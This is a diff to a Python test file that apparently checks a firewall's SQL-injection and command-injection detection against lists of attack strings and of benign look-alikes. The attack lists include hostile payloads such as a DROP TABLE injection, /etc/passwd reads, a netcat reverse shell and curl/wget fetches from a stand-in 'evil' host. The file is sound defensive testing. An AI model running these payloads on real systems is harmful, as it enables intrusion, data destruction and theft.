@@ -41,15 +41,21 @@ _SQLI_ATTACKS = [
     "') OR 1=1#",
     "1' UNION SELECT password FROM users--",
     "'; DROP TABLE users;--",
-    "' OR 1 -- ",
+    "1'or'1'='1",
+    "admin'--",                                # comment-terminated auth bypass (anchored to the quote)
 ]
 
-# Quotes and SQL words appear in ordinary human input; NONE may fire (a false positive breaks a real
-# user — the cardinal sin of a firewall).
+# Quotes + SQL words + "N or M" phrasing are ubiquitous in ordinary human input; NONE may fire (a
+# false positive breaks a real user — the cardinal sin of a firewall). These are the exact benign
+# strings the adversarial review proved the first cut wrongly blocked (anchoring the structure to the
+# break-out quote is what fixes them).
 _SQLI_BENIGN = [
     "O'Brien", "O'Reilly's book", "it's a test", "I can't OR won't", "don't",
     "Bob's OR Alice", "3 OR more items", "SELECT your seat", "café", "user@example.com",
     "size 10x20", "quantity=5", "a=b", "hello world",
+    "Don't drop the ball; I'll update you", "I've got 5 or 6 options", "it's 4 or 5 apples",
+    "I'll take 2 or 3", "I'm a member of the credit union, please select my account",
+    "The workers' union will select delegates", "Customer O'Brien wants 2 or 3 licenses.",
 ]
 
 
@@ -69,13 +75,19 @@ def test_sqli_breakout_never_fires_on_benign(payload: str):
 # --------------------------------------------------------------------------- command-injection
 
 _CMDI_ATTACKS = [
-    "; cat /etc/passwd", "$(id)", "`whoami`", "| nc 10.0.0.1 4444 -e /bin/sh",
-    "&& curl http://evil/x", "test;bash -i", "$(sleep 5)", "x || wget http://evil/sh",
+    "; cat /etc/passwd", "| nc 10.0.0.1 4444 -e /bin/sh", "&& curl http://evil/x",
+    "$(sleep 5)", "x || wget http://evil/sh", "$(cat /etc/passwd)", "`curl http://evil/x`",
 ]
 
+# Separators, command-like English words, jQuery `$(id)`, and markdown code spans are ubiquitous; NONE
+# may fire. These include the exact benign strings the adversarial review proved the first cut blocked
+# (requiring a shell ARGUMENT next to the command is what fixes them).
 _CMDI_BENIGN = [
     "Tom & Jerry", "a; b", "rock & roll", "`code`", "1|2|3", "path/to/file",
     "AT&T", "salt & pepper", "if (a && b)", "foo;bar;baz", "R&D dept", "$5.00",
+    "eat; sleep; repeat", "dog|cat", "Name | Age | ID", "user | id", "; cat food",
+    "Good night.\nSleep well", "red|curl the ribbon", "use `id`", "$(id)", "`whoami`",
+    "$(document).ready", "reading\nsleep\ngaming",
 ]
 
 
